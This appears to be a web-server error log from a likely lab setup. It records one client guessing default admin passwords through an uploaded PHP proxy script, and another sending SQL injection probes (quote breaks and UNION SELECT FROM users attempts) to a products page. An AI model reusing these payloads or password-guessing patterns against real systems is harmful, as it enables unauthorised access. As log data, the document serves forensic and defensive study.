2016/06/03 11:13:36 [error] 12#0: *15 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=admin HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:13:54 [error] 12#0: *15 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: send_cookies in /var/www/uploads/uploads/prxy.php on line 167
PHP message: PHP Notice:  Undefined index: user_agent in /var/www/uploads/uploads/prxy.php on line 184
PHP message: PHP Notice:  Undefined offset: 1 in /var/www/uploads/uploads/prxy.php on line 190" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=admin HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:14:03 [error] 12#0: *15 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: send_cookies in /var/www/uploads/uploads/prxy.php on line 167
PHP message: PHP Notice:  Undefined index: user_agent in /var/www/uploads/uploads/prxy.php on line 184
PHP message: PHP Notice:  Undefined offset: 1 in /var/www/uploads/uploads/prxy.php on line 190" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=12345 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:14:07 [error] 12#0: *15 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: send_cookies in /var/www/uploads/uploads/prxy.php on line 167
PHP message: PHP Notice:  Undefined index: user_agent in /var/www/uploads/uploads/prxy.php on line 184
PHP message: PHP Notice:  Undefined offset: 1 in /var/www/uploads/uploads/prxy.php on line 190" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=password HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:14:28 [error] 12#0: *15 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: send_cookies in /var/www/uploads/uploads/prxy.php on line 167
PHP message: PHP Notice:  Undefined index: user_agent in /var/www/uploads/uploads/prxy.php on line 184
PHP message: PHP Notice:  Undefined offset: 1 in /var/www/uploads/uploads/prxy.php on line 190" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=qwertz123456 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:22:05 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;&quot;1&quot;&quot;&quot; in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:22:56 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, near &quot;1&quot;: syntax error in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22%20UNION%201%20FROM%20users-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:23:02 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, near &quot;1&quot;: syntax error in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22%20UNION%201,%202%20FROM%20users-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:23:09 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, near &quot;1&quot;: syntax error in /var/www/products.php on line 9
